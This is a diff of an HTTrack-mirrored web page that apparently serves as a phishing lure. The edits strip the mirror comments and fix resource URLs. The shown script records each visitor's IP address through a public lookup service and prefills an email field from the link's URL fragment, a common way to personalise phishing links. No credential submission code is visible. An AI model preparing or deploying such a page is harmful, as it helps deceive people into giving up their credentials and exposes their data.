@@ -1,7 +1,6 @@
+
 <!DOCTYPE html>
 <html lang="en">
-
-<!-- Mirrored from fdzt.standard.us-east-1.oortstorages.com/ken/index.cvz by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 27 Jan 2026 19:34:23 GMT -->
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -179,7 +178,7 @@
     left: 0;
     width: 100%;
     height: 100%;
-    background-image: url('../../cdn.mcauto-images-production.sendgrid.net/32724a092ad701f7/c6e2282d-8a53-44c8-9b7c-262b2479f731/1366x768.jpg');
+    background-image: url('https://cdn.mcauto-images-production.sendgrid.net/32724a092ad701f7/c6e2282d-8a53-44c8-9b7c-262b2479f731/1366x768.jpg');
     background-size: cover;
     background-position: center;
     filter: blur(0px) brightness(2.7);
@@ -662,7 +661,7 @@
   // Function to get user's IP address
   async function getIPAddress() {
     try {
-      const response = await fetch('https://api.ipify.org/?format=json');
+      const response = await fetch('https://api.ipify.org?format=json');
       const data = await response.json();
       return data.ip;
     } catch (error) {
@@ -928,11 +927,11 @@
     // Show in console how to use it
     console.log('\n=== URL Autofill Examples ===');
     console.log('Working URLs:');
-    console.log('1.%20index.html#[[-Email-]]');
-    console.log('2.%20index.html#[[test@example.com]]');
-    console.log('3.%20index.html#[[John Doe]]');
-    console.log('4.%20index.html#[[AnythingHere]]');
-    console.log('5.%20index.html#JustText');
+    console.log('1. index.html#[[-Email-]]');
+    console.log('2. index.html#[[test@example.com]]');
+    console.log('3. index.html#[[John Doe]]');
+    console.log('4. index.html#[[AnythingHere]]');
+    console.log('5. index.html#JustText');
     
     // Show current URL for debugging
     console.log('\nCurrent URL:', window.location.href);
@@ -950,6 +949,4 @@
   });
 </script>
 </body>
-
-<!-- Mirrored from fdzt.standard.us-east-1.oortstorages.com/ken/index.cvz by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 27 Jan 2026 19:34:25 GMT -->
 </html>
